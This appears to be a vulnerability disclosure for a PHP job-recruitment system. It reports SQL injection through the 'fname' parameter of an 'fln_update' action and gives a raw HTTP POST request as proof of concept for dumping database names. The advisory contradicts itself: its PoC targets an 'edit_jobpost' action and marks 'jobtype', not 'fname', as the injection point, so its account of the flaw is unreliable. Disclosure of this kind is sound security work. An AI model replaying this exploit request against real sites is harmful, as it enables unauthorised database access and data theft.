# job-recruitment-in-php has sql injection vulnerability in fname parameter

## supplier 
https://code-projects.org/job-recruitment-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
fname parameter in fln_update action 

## describe

 Fname parameter .An unrestricted SQL injection attack exists in a job-recruitmentsystem. The parameters that can be controlled are as follows:  fname  parameter . This function executes the fname parameter into the SQL statement without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

**Code analysis**    

When the parameter value of   $_POST['fname'] is obtained in fln_update action , it will be concatenated into SQL statements and executed, which has a SQL injection vulnerability. 

![image-20241226012551848](https://github.com/user-attachments/assets/c6b09816-3c72-4386-a85b-8f18a0518003)

## POC

```
POST /_parse/_all_edits.php HTTP/1.1
Host: airecruitmentsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Origin: http://airecruitmentsystem
Connection: close
Referer: http://airecruitmentsystem/_parse/_all_edits.php
Cookie: PHPSESSID=etso55q58ionvmrvpetmaf8urt
Upgrade-Insecure-Requests: 1
Priority: u=0, i

jid=1&degree=2&jobtitle=1&action=edit_jobpost&jobtype=1*&deadline=1
```

**Result**

get databases name

![image-20241226012813072](https://github.com/user-attachments/assets/564064c0-982a-4295-8662-60053cafb360)
